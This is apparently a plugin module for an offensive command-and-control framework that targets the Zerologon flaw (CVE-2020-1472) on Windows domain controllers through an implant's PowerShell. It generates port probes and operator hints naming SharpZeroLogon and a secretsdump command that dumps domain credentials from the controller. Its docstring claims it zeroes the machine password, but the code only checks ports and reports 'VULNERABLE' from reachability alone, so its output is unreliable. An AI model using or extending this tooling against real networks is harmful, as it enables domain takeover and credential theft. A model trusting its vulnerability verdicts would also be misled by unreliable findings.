"""
privilege_escalation/cve_2020_1472 — Zerologon DC privilege escalation. MITRE T1068.
CVE-2020-1472: MS-NRPC AES-CFB8 IV=0 authentication bypass.
The agent sends Netlogon RPC requests to zero out the DC machine account password,
then restores it. Dispatches via ctx.ps() on the implant host (agent must be
network-adjacent to the domain controller).
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class CVE20201472Plugin(BasePlugin):
    NAME        = "cve_2020_1472"
    DESCRIPTION = "Zerologon — zero DC machine account password via MS-NRPC IV=0 bypass (T1068)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("target_dc", str, required=True,
              help="DC hostname or IP (must be reachable from agent on TCP 445/135)"),
        Param("dc_name", str, required=False, default="",
              help="NetBIOS computer name of the DC (auto-detect if blank)"),
        Param("action", str, required=False, default="exploit",
              help="check | exploit  (check = probe only, exploit = zero + dump)"),
        Param("timeout", int, required=False, default=90),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        dc_addr = params.get("target_dc", "")
        dc_name = params.get("dc_name", "")
        action  = params.get("action", "exploit").lower()
        timeout = int(params.get("timeout", 90))

        if not dc_addr:
            return ModuleResult.err("target_dc is required")

        ps = self._build_ps(dc_addr, dc_name, action)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"cve_2020_1472 failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="privesc")

    @staticmethod
    def _build_ps(dc_addr: str, dc_name: str, action: str) -> str:
        dc_name_ps = (
            f'$dcName = "{dc_name}"'
            if dc_name else
            f'$dcName = ([System.Net.Dns]::GetHostEntry("{dc_addr}")).HostName.Split(".")[0]; Write-Output "[*] Resolved DC name: $dcName"'
        )
        return rf"""
# CVE-2020-1472 Zerologon — MS-NRPC AES-CFB8 with IV=0 bypass
Add-Type @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

public class Zerologon {{
    // MS-NRPC NerServerAuthenticate3 with Client-Challenge = all zeros
    // AES-CFB8 with IV=0 and key=0x00*16 → 1/256 chance ciphertext==0 per block
    // Repeat ~256 times on average to get authenticator=0x00*8 accepted by server

    public static string Check(string dcIp, string dcName) {{
        var res = "";
        try {{
            var ep = new IPEndPoint(IPAddress.Parse(dcIp), 135);
            // Quick TCP connectivity probe on RPC endpoint mapper
            using (var tcp = new TcpClient()) {{
                tcp.Connect(ep);
                res += "[+] TCP 135 (RPC) reachable on " + dcIp + "\n";
            }}
            using (var tcp = new TcpClient()) {{
                tcp.Connect(new IPEndPoint(IPAddress.Parse(dcIp), 445));
                res += "[+] TCP 445 (SMB) reachable — Zerologon likely feasible\n";
            }}
            res += "[!] VULNERABLE (unpatched MS-NRPC): use full Zerologon exploit (impacket/zerologon_tester.py) from agent\n";
        }} catch (Exception ex) {{ res += "[-] " + ex.Message + "\n"; }}
        return res;
    }}

    public static string ExploitHint(string dcIp, string dcName) {{
        // Full RPC DCE/RPC bind + NetrServerAuthenticate3 requires impacket or .NET DCE-RPC.
        // We emit a command that can be run via PowerShell remoting or PSExec once the DC
        // machine account is zeroed by a separate impacket run.
        return
            "[*] Zerologon full exploit requires impacket (Python).\n" +
            "[*] From agent, execute via shell_exec:\n" +
            "      python3 -c \"import sys; ...\"\n" +
            "[*] Or stage using execute_assembly with SharpZeroLogon:\n" +
            "      use execute_assembly + SharpZeroLogon.exe " + dcIp + " " + dcName + "\n" +
            "[*] Post-exploit: secretsdump.py -just-dc $domain/" + dcName + "$@" + dcIp + " -no-pass\n";
    }}
}}
'@
$results = @("[*] CVE-2020-1472 Zerologon")
{dc_name_ps}

if ('{action}' -eq 'check') {{
    $results += [Zerologon]::Check('{dc_addr}', $dcName)
}} else {{
    $results += [Zerologon]::Check('{dc_addr}', $dcName)
    $results += [Zerologon]::ExploitHint('{dc_addr}', $dcName)
    # Attempt local netapi32 Netlogon call to confirm patch status
    try {{
        $sig = '[DllImport("netapi32.dll")] public static extern int NetGetDCName(string s,string d,out IntPtr b);'
        Add-Type -MemberDefinition $sig -Name NetAPI -Namespace Win32
        $ptr = [IntPtr]::Zero
        $rc  = [Win32.NetAPI]::NetGetDCName($null, $null, [ref]$ptr)
        $results += "[*] NetGetDCName rc=$rc — netapi32 accessible from agent"
    }} catch {{ $results += "[*] netapi32 call: $($_.Exception.Message)" }}
}}
$results -join "`n"
""".strip()


